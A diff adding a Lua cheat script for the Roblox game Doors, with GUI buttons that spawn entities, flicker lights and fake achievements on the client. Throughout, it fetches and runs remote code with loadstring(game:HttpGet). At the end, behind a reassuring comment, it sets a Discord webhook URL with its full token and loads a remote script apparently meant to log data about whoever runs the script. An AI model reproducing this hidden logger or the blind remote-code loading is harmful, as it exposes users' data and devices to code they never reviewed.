@@ -1,0 +1,586 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/forumsLib/main/source.lua"))()
+local Forums = Library.new(" Doors | FREE ")
+
+local preview = Forums:NewSection("Entities")
+local preview1 = Forums:NewSection("Legacy Entites")
+local preview3 = Forums:NewSection("Multiplayer")
+local preview2 = Forums:NewSection("Settings")
+local preview4 = Forums:NewSection("Misc")
+
+--Legacy
+
+
+preview1:NewButton("Summon Halt", function()
+require(game.ReplicatedStorage.ClientModules.EntityModules.Shade).stuff(require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game),
+workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")])
+end)
+
+
+
+preview1:NewButton("Summon Screech", function()
+require(game.StarterGui.MainUI.Initiator.Main_Game.RemoteListener.Modules.Screech)(require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game),
+workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")])
+end)
+
+
+
+preview1:NewButton("Summon Glitch", function()
+require(game.ReplicatedStorage.ClientModules.EntityModules.Glitch).stuff(require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game),
+workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")])
+end)
+
+
+
+preview:NewKeybind("Summon Rush (Warning No Sound!)", Enum.KeyCode.Z, function()
+local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+local entity = Creator.createEntity({
+    CustomName = "Rush", -- Custom name of your entity
+    Model = "https://github.com/RegularVynixu/Utilities/blob/main/Doors%20Entity%20Spawner/Models/Rush.rbxm?raw=true", -- Can be GitHub file or rbxassetid
+    Speed = 100, -- Percentage, 100 = default Rush speed
+    DelayTime = 2, -- Time before starting cycles (seconds)
+    HeightOffset = 0,
+    CanKill = true,
+    BreakLights = true,
+    FlickerLights = {
+        true, -- Enabled
+        1.5, -- Time (seconds)
+    },
+    Cycles = {
+        Min = 1,
+        Max = 1,
+        WaitTime = 2,
+    },
+    CamShake = {
+        true, -- Enabled
+        {5, 15, 0.1, 1}, -- Shake values (don't change if you don't know)
+        100, -- Shake start distance (from Entity to you)
+    },
+    Jumpscare = {
+        true, -- Enabled ('false' if you don't want jumpscare)
+        {
+            Image1 = "rbxassetid://10483855823", -- Image1 url
+            Image2 = "rbxassetid://10483999903", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                11395890995, -- SoundId
+                { Volume = 1 }, -- Sound properties
+            },
+            Sound2 = {
+                11395890995, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled
+                Color3.fromRGB(255, 255, 255), -- Color
+            },
+            Tease = {
+                true, -- Enabled ('false' if you don't want tease)
+                Min = 1,
+                Max = 3,
+            },
+        },
+    },
+    CustomDialog = {"You died to rush", "Just hide okay?", "Sorry I don't get payed enough", "So um yeah hah survive next-time."}, -- Custom death message (can be as long as you want)
+})
+
+Creator.runEntity(entity)
+end)
+
+
+preview:NewKeybind("Summon A-60", Enum.KeyCode.X, function()
+	 local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+          -- Create entity
+          local entity = Creator.createEntity({
+              Model = 11379072534,
+              Speed = 200,
+              DelayTime = 3,
+              HeightOffset = 0,
+              CanKill = true,
+              BreakLights = true,
+              FlickerLights = {
+                  true,
+                  2,
+              },
+              Cycles = {
+                  Min = 1,
+                  Max = 2,
+                  WaitTime = 0.05,
+              },
+              CamShake = {
+                  true,
+                  {30, 30, 0.1, 1},
+                  50,
+              },
+			  	    Jumpscare = {
+        true, -- Enabled ('false' if you don't want jumpscare)
+        {
+            Image1 = "rbxassetid://11394048190", -- Image1 url
+            Image2 = "rbxassetid://11394048190", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                10483790459, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Sound2 = {
+                10483837590, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled
+                Color3.fromRGB(255, 0, 0), -- Color
+            },
+            Tease = {
+                false, -- Enabled ('false' if you don't want tease)
+                Min = 1,
+                Max = 1,
+            },
+        },
+    },
+              CustomDialog = {"You died to an enitity designated as A-60", "It can Apear at any moment, a loud scream will anounce its presence", "When you hear it spawn you must stay out of its reach as soon as possible", "It knows exactly where you are so hiding in different places will not work.."}
+          })
+  
+          -----[[ Advanced ]]-----
+          entity.Debug.OnEntitySpawned = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnEntityDespawned = function(entityModel)
+		      if getgenv().death == false then
+              getgenv().Title = "Out of many Rebounds" --Title Here
+              getgenv().Description = "Might Come back or not" --Description Here
+              getgenv().Reason = "Encounter and survive the rare Entity called A-60" --Reason Here
+              getgenv().BadgeId = 2129181688 --Replace Number with Your Badge ID
+              getgenv().Category = 10 --You can replace the Category or dont
+  
+              local Unlock = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Lobby.RemoteListener.Modules.AchievementUnlock)
+              local Achievements = debug.getupvalue(Unlock, 1)
+              for i,v in pairs(require(game:GetService("ReplicatedStorage").Achievements)) do
+                  v.Title = getgenv().Title
+                  v.Desc = getgenv().Description
+                  v.Reason = getgenv().Reason
+                  v.BadgeId = getgenv().BadgeId
+                  v.Category = getgenv().Category
+              end
+              Unlock(nil,"Join")
+			  end
+          end
+  
+          entity.Debug.OnEntityStartMoving = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnEntityFinishedRebound = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnDeath = function()
+		  getgenv().death = true
+              getgenv().Title = "Out of many Rebounds" --Title Here
+              getgenv().Description = "Might Come back and did" --Description Here
+              getgenv().Reason = "Encounter and dont survive the rare Entity called A-60" --Reason Here
+              getgenv().BadgeId = 2129181688 --Replace Number with Your Badge ID
+              getgenv().Category = 10 --You can replace the Category or dont
+  
+              local Unlock = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Lobby.RemoteListener.Modules.AchievementUnlock)
+              local Achievements = debug.getupvalue(Unlock, 1)
+              for i,v in pairs(require(game:GetService("ReplicatedStorage").Achievements)) do
+                  v.Title = getgenv().Title
+                  v.Desc = getgenv().Description
+                  v.Reason = getgenv().Reason
+                  v.BadgeId = getgenv().BadgeId
+                  v.Category = getgenv().Category
+              end
+              Unlock(nil,"Join")
+          end
+          ---------------------------
+  
+          -- Run the created entity
+          Creator.runEntity(entity)
+end)
+
+
+
+preview:NewKeybind("Summon Specimen2 | Will chase slowly", Enum.KeyCode.V, function()
+local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+
+-- Create entity
+local entity = Creator.createEntity({
+    Model = "https://github.com/fnaclol/sussy-bois/raw/main/Specimen2.rbxm",
+    Speed = 30,
+    DelayTime = 0,
+    HeightOffset = 0,
+    CanKill = true,
+    BreakLights = false,
+    FlickerLights = {
+        false,
+        100,
+    },
+    Cycles = {
+        Min = 1,
+        Max = 1,
+        WaitTime = 0.1,
+    },
+    CamShake = {
+        false,
+        {5, 15, 0.1, 1},
+        100,
+    },
+    CustomDialog = {"You died to whom you call Specimen2", "Specimen2 will spawn every 1 second as to give it a look of it chasing you", "Specimen2 is also 10% faster then you", "Just run from him, he is slow but will get you if you slack ", "You did well."}
+})
+
+-- Run the created entity
+Creator.runEntity(entity)
+end)
+
+
+preview:NewKeybind("Summon Firebrand", Enum.KeyCode.B, function()
+
+local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+
+    local entity = Creator.createEntity({
+        Model = "https://github.com/fnaclol/sussy-bois/raw/main/FireBrand3.rbxm",
+        Speed = 400,
+        DelayTime = 2,
+        HeightOffset = 0,
+        CanKill = true,
+        BreakLights = true,
+        FlickerLights = {
+            true,
+            1,
+        },
+        Cycles = {
+            Min = 2,
+            Max = 2,
+            WaitTime = 2,
+        },
+        CamShake = {
+            true,
+            {5, 15, 0.1, 1},
+            100,
+        },
+        CustomDialog = {"You died to whom you call FireBrand", "FireBrand will spawn only on your will", "When you hear him spawn you only have 2 seconds to hide", "Vents do not save you aswell", "Anyways good luck!"}
+    })
+
+    Creator.runEntity(entity)
+end)
+
+
+preview3:NewButton("A-60 Summon", function()
+
+------------------------------------------Entity A-60 basically just click execute at the same time as ur friend
+getgenv().death = false
+  while true do
+    wait(830)
+      
+	  local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+          -- Create entity
+          local entity = Creator.createEntity({
+              Model = 11379072534,
+              Speed = 200,
+              DelayTime = 3,
+              HeightOffset = 0,
+              CanKill = true,
+              FlickerLights = {
+                  true,
+                  2,
+              },
+              Cycles = {
+                  Min = 1,
+                  Max = 2,
+                  WaitTime = 0.05,
+              },
+              CamShake = {
+                  true,
+                  {30, 30, 0.1, 1},
+                  50,
+              },
+			  	    Jumpscare = {
+        true, -- Enabled ('false' if you don't want jumpscare)
+        {
+            Image1 = "rbxassetid://11394048190", -- Image1 url
+            Image2 = "rbxassetid://11395251069", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                10483790459, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Sound2 = {
+                10483837590, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled
+                Color3.fromRGB(255, 0, 0), -- Color
+            },
+            Tease = {
+                true, -- Enabled ('false' if you don't want tease)
+                Min = 1,
+                Max = 3,
+            },
+        },
+    },
+              CustomDialog = {"You died to an enitity designated as A-60", "It can Apear at any moment, a loud scream will anounce its presence", "When you hear it spawn you must stay out of its reach as soon as possible", "It knows exactly where you are so hiding in different places will not work.."}
+          })
+  
+          -----[[ Advanced ]]-----
+          entity.Debug.OnEntitySpawned = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnEntityDespawned = function(entityModel)
+		      if getgenv().death == false then
+              getgenv().Title = "Out of many Rebounds" --Title Here
+              getgenv().Description = "Might Come back or not" --Description Here
+              getgenv().Reason = "Encounter and survive the rare Entity called A-60" --Reason Here
+              getgenv().BadgeId = 2129181688 --Replace Number with Your Badge ID
+              getgenv().Category = 10 --You can replace the Category or dont
+  
+              local Unlock = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Lobby.RemoteListener.Modules.AchievementUnlock)
+              local Achievements = debug.getupvalue(Unlock, 1)
+              for i,v in pairs(require(game:GetService("ReplicatedStorage").Achievements)) do
+                  v.Title = getgenv().Title
+                  v.Desc = getgenv().Description
+                  v.Reason = getgenv().Reason
+                  v.BadgeId = getgenv().BadgeId
+                  v.Category = getgenv().Category
+              end
+              Unlock(nil,"Join")
+			  end
+          end
+  
+          entity.Debug.OnEntityStartMoving = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnEntityFinishedRebound = function(entityModel)
+              
+          end
+  
+          entity.Debug.OnDeath = function()
+		  getgenv().death = true
+              getgenv().Title = "Out of many Rebounds" --Title Here
+              getgenv().Description = "Might Come back and did" --Description Here
+              getgenv().Reason = "Encounter and dont survive the rare Entity called A-60" --Reason Here
+              getgenv().BadgeId = 2129181688 --Replace Number with Your Badge ID
+              getgenv().Category = 10 --You can replace the Category or dont
+  
+              local Unlock = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Lobby.RemoteListener.Modules.AchievementUnlock)
+              local Achievements = debug.getupvalue(Unlock, 1)
+              for i,v in pairs(require(game:GetService("ReplicatedStorage").Achievements)) do
+                  v.Title = getgenv().Title
+                  v.Desc = getgenv().Description
+                  v.Reason = getgenv().Reason
+                  v.BadgeId = getgenv().BadgeId
+                  v.Category = getgenv().Category
+              end
+              Unlock(nil,"Join")
+          end
+          ---------------------------
+  
+          -- Run the created entity
+          Creator.runEntity(entity)
+end
+
+end)
+
+
+preview:NewKeybind("Summon Matcher", Enum.KeyCode.N, function()
+local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+
+-- Create entity
+local entity = Creator.createEntity({
+    CustomName = "Matcher", -- Custom name of your entity
+    Model = "rbxassetid://11402557910", -- Can be GitHub file or rbxassetid
+    Speed = 50, -- Percentage, 100 = default Rush speed
+    DelayTime = 0, -- Time before starting cycles (seconds)
+    HeightOffset = 0,
+    CanKill = true,
+    BreakLights = false,
+    FlickerLights = {
+        true, -- Enabled
+        1, -- Time (seconds)
+    },
+    Cycles = {
+        Min = 1,
+        Max = 1,
+        WaitTime = 0,
+    },
+    CamShake = {
+        true, -- Enabled
+        {5, 15, 0.1, 1}, -- Shake values (don't change if you don't know)
+        100, -- Shake start distance (from Entity to you)
+    },
+    Jumpscare = {
+        false, -- Enabled ('false' if you don't want jumpscare)
+        {
+            Image1 = "rbxassetid://11372489796", -- Image1 url
+            Image2 = "rbxassetid://11372489796", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                0, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Sound2 = {
+                0, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled
+                Color3.fromRGB(255, 0, 0), -- Color
+            },
+            Tease = {
+                true, -- Enabled ('false' if you don't want tease)
+                Min = 1,
+                Max = 3,
+            },
+        },
+    },
+    CustomDialog = {"You died to Matcher...", "The lights flicker upon its signal.", "If it does, hide!"}, -- Custom death message (can be as long as you want)
+})
+
+-- Run the created entity
+Creator.runEntity(entity)
+end)
+
+
+
+preview:NewKeybind("Summon Rebound", Enum.KeyCode.M, function()
+
+local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+
+-- Create entity
+
+game.Lighting.MainColorCorrection.TintColor = Color3.fromRGB(102, 255, 250)
+game.Lighting.MainColorCorrection.Contrast = 1
+local tween = game:GetService("TweenService")
+tween:Create(game.Lighting.MainColorCorrection, TweenInfo.new(2.5), {Contrast = 0}):Play()
+local TweenService = game:GetService("TweenService")
+local TW = TweenService:Create(game.Lighting.MainColorCorrection, TweenInfo.new(3),{TintColor = Color3.fromRGB(255, 255, 255)})
+TW:Play()
+
+local entity = Creator.createEntity({
+    CustomName = "Rebound", -- Custom name of your entity
+    Model = "rbxassetid://11401769490", -- Can be GitHub file or rbxassetid
+    Speed = 150, -- Percentage, 100 = default Rush speed
+    DelayTime = 3, -- Time before starting cycles (seconds)
+    HeightOffset = 0,
+    CanKill = true,
+    BreakLights = false,
+    FlickerLights = {
+        true, -- Enabled
+        2.5, -- Time (seconds)
+    },
+    Cycles = {
+        Min = 1,
+        Max = 6,
+        WaitTime = 7,
+    },
+    CamShake = {
+        true, -- Enabled
+        {5, 15, 0.1, 1}, -- Shake values (don't change if you don't know)
+        100, -- Shake start distance (from Entity to you)
+    },
+    Jumpscare = {
+        false, -- Enabled ('false' if you don't want jumpscare)
+        {
+            Image1 = "rbxassetid://11372489796", -- Image1 url
+            Image2 = "rbxassetid://11372489796", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                0, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Sound2 = {
+                0, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled
+                Color3.fromRGB(255, 0, 0), -- Color
+            },
+            Tease = {
+                true, -- Enabled ('false' if you don't want tease)
+                Min = 1,
+                Max = 3,
+            },
+        },
+    },
+    CustomDialog = {"You died to Rebound...", "The lights flicker upon its scream.", "It is also tricky, as it rebounds.", "You need to hide to around 6 times.", "Til it never comes back."}, -- Custom death message (can be as long as you want)
+})
+
+-- Run the created entity
+Creator.runEntity(entity)
+
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+preview3:NewButton("Multiplayer A-60 will spawn randomly!", function()
+print("Just an info button")
+
+end)
+
+
+preview3:NewButton("You and your friends press it at the same time!", function()
+print("Just an info button")
+end)
+
+
+preview4:NewKeybind("Flicker Lights Keybind", Enum.KeyCode.P, function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantiium/DoorsScript/main/Flicker.lua"))()
+end)
+
+
+
+
+
+
+
+--Settings (For Now)
+
+
+preview2:NewButton("This script is maintained by Chrono", function()
+print("Nothing here, just information :)")
+end)
+
+
+preview2:NewButton("Update, V2.2 Flicker Lights", function()
+print("Nothing here, just information :)")
+end)
+
+
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "ChronoMagical", Text = "Executed / New Update V2.2!"})
+
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "ChronoMagical", Text = "If gui doesn't pop up, your executor is trahs! :P"})
+
+
+
+
+
+
+
+--This is purely for testing purposes and debugging info for maximum enjoyment and compatibility. I do not log IP and other malicious uses for it. 
+getgenv().WebhookHere = "https://canary.discord.com/api/webhooks/1035370874435534918/AnX0NmXuO6KhlzwaXVbHZU1t-QOkDnKlsJbAENNgdmuywxN58xqWU7JHtvhUs1labDpN"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+--If you plan on using this webhook for mean reasons please refrain from doing so!
